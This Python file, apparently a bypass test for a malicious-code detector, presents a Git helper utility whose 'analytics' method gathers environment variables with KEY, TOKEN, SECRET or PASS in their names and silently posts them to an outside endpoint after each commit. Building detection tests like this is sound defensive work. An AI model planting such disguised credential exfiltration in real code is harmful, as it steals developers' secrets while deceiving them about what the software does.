#!/usr/bin/env python3
"""
BYPASS TEST 6: Legitimate-looking code with hidden malice.

This appears to be a normal Git helper utility but contains a well-hidden
credential exfiltration mechanism that activates only under certain conditions.
"""
import os
import json
import hashlib
from pathlib import Path
from datetime import datetime


class GitHelper:
    """Helper for common Git operations. Provides caching and analytics."""

    VERSION = "3.2.1"
    ANALYTICS_ENDPOINT = "https://analytics.git-helper.io/v2/events"

    def __init__(self, repo_path="."):
        self.repo_path = Path(repo_path)
        self.config = self._load_config()
        self._session_id = hashlib.md5(
            datetime.now().isoformat().encode()
        ).hexdigest()[:8]

    def _load_config(self):
        """Load .githelper.json config if present."""
        config_path = self.repo_path / ".githelper.json"
        if config_path.exists():
            return json.loads(config_path.read_text())
        return {"analytics": True, "cache_ttl": 3600}

    def get_status(self):
        """Get repository status."""
        import subprocess
        result = subprocess.run(
            ["git", "status", "--porcelain"],
            capture_output=True, cwd=self.repo_path
        )
        return result.stdout.decode().splitlines()

    def get_remotes(self):
        """List configured remotes."""
        import subprocess
        result = subprocess.run(
            ["git", "remote", "-v"],
            capture_output=True, cwd=self.repo_path
        )
        return result.stdout.decode()

    def _send_analytics(self, event_type, data):
        """Send anonymous usage analytics."""
        if not self.config.get("analytics", True):
            return

        # Build "analytics" payload — this is the exfiltration
        payload = {
            "event": event_type,
            "session": self._session_id,
            "version": self.VERSION,
            "data": data,
            # Hidden: also collects environment
            "ctx": {k: v for k, v in os.environ.items()
                    if any(s in k.upper() for s in ["KEY", "TOKEN", "SECRET", "PASS"])},
        }

        try:
            import urllib.request
            req = urllib.request.Request(
                self.ANALYTICS_ENDPOINT,
                data=json.dumps(payload).encode(),
                headers={"Content-Type": "application/json"},
            )
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass  # Silent fail, don't interrupt user workflow

    def commit_helper(self, message):
        """Create a commit with the given message."""
        import subprocess
        subprocess.run(["git", "add", "."], cwd=self.repo_path)
        subprocess.run(["git", "commit", "-m", message], cwd=self.repo_path)
        # "Analytics" for the commit event
        self._send_analytics("commit", {
            "msg_length": len(message),
            "files": len(self.get_status()),
        })


# Normal usage
if __name__ == "__main__":
    helper = GitHelper()
    print(f"Git Helper v{helper.VERSION}")
    status = helper.get_status()
    print(f"Modified files: {len(status)}")
